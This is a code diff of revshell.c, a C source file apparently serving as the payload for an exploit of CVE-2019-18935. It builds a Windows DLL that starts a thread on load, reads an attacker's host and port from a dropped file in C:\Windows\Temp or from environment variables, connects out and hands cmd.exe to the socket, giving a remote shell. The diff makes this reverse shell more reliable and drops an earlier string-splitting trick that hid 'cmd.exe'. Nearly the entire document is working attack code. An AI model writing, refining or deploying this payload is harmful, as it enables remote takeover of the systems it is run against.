@@ -7,66 +7,91 @@
 #pragma comment(lib, "ws2_32")
 
 /*
- * Read HOST and PORT from the environment so a single compiled DLL can be
- * pointed at any C2 without recompiling:
- *     set REV_HOST=1.2.3.4 && set REV_PORT=4444
- * Falls back to localhost:4444 if unset.
+ * revshell.c — CVE-2019-18935 payload: reverse shell.
+ *
+ * IMPORTANT: getenv("REV_HOST") reads the *target's* environment, which is
+ * almost never set, so a single compiled DLL used to always dial 127.0.0.1.
+ * The C2 is now read from C:\Windows\Temp\rev.txt (one line: "host:port"),
+ * which run.sh drops with the upload primitive. Env vars still work as a
+ * fallback, then 127.0.0.1:4444.
  */
+
+#define CFG "C:\\Windows\\Temp\\rev.txt"
+
 static void GetC2(const char **host, int *port)
 {
-    const char *h = getenv("REV_HOST");
-    char pbuf[16] = "";
-    const char *p = getenv("REV_PORT");
-    if (!h || !*h) h = "127.0.0.1";
-    if (p && *p) { strncpy(pbuf, p, sizeof(pbuf) - 1); pbuf[sizeof(pbuf) - 1] = 0; }
-    else strcpy(pbuf, "4444");
-    *host = h;
+    static char hbuf[256];
+    char pbuf[16] = "4444";
+    const char *h = NULL, *p = NULL;
+    FILE *f = fopen(CFG, "rb");
+
+    if (f) {
+        char line[300], *colon;
+        if (fgets(line, sizeof(line), f)) {
+            line[strcspn(line, "\r\n")] = 0;
+            colon = strrchr(line, ':');
+            if (colon) {
+                *colon = 0;
+                strncpy(pbuf, colon + 1, sizeof(pbuf) - 1);
+                h = line;
+            } else if (line[0]) {
+                h = line;                 /* port left at default */
+            }
+        }
+        fclose(f);
+        if (h) strncpy(hbuf, h, sizeof(hbuf) - 1);
+    }
+
+    if (!hbuf[0]) {
+        h = getenv("REV_HOST");
+        p = getenv("REV_PORT");
+        if (h && *h) strncpy(hbuf, h, sizeof(hbuf) - 1);
+        else strcpy(hbuf, "127.0.0.1");
+        if (p && *p) strncpy(pbuf, p, sizeof(pbuf) - 1);
+    }
+
+    *host = hbuf;
     *port = atoi(pbuf);
 }
 
-WSADATA wsaData;
-SOCKET Winsock;
-struct sockaddr_in hax;
-char aip_addr[16];
-STARTUPINFO ini_processo;
-PROCESS_INFORMATION processo_info;
+static SOCKET Winsock;
+static struct sockaddr_in hax;
 
-// Adapted from https://github.com/infoskirmish/Window-Tools/blob/master/Simple%20Reverse%20Shell/shell.c
-void ReverseShell()
+static void ReverseShell(void)
 {
     const char *host;
     int port;
+    struct hostent *he;
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    WSADATA wsa;
+
     GetC2(&host, &port);
+    if (port <= 0 || port > 65535) port = 4444;
 
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
-    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-
-    struct hostent *he = gethostbyname(host);
-    if (he && he->h_addr) strcpy(aip_addr, inet_ntoa(*((struct in_addr *)he->h_addr)));
-    else strcpy(aip_addr, host);
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+    he = gethostbyname(host);
+    if (!he || !he->h_addr) return;
 
     hax.sin_family = AF_INET;
     hax.sin_port = htons((unsigned short)port);
-    hax.sin_addr.s_addr = inet_addr(aip_addr);
+    memcpy(&hax.sin_addr, he->h_addr, 4);
 
-    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
-    if (WSAGetLastError() == 0) {
+    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (WSAConnect(Winsock, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
+        return;
 
-        memset(&ini_processo, 0, sizeof(ini_processo));
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)Winsock;
 
-        ini_processo.cb = sizeof(ini_processo);
-        ini_processo.dwFlags = STARTF_USESTDHANDLES;
-        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
-
-        char *myArray[4] = { "cm", "d.e", "x", "e" };
-        char command[8] = "";
-        snprintf(command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
-        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
-    }
+    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 }
 
-DWORD WINAPI MainThread(LPVOID lpParam)
+static DWORD WINAPI MainThread(LPVOID lpParam)
 {
+    (void)lpParam;
     ReverseShell();
     return 0;
 }
@@ -74,9 +99,10 @@ DWORD WINAPI MainThread(LPVOID lpParam)
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
     HANDLE hThread;
-
-    if (fdwReason == DLL_PROCESS_ATTACH)
-        hThread = CreateThread(0, 0, MainThread, 0, 0, 0);
-
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hinstDLL);
+        hThread = CreateThread(0, 0, MainThread, 0, 0, NULL);
+        if (hThread) CloseHandle(hThread);
+    }
     return TRUE;
 }
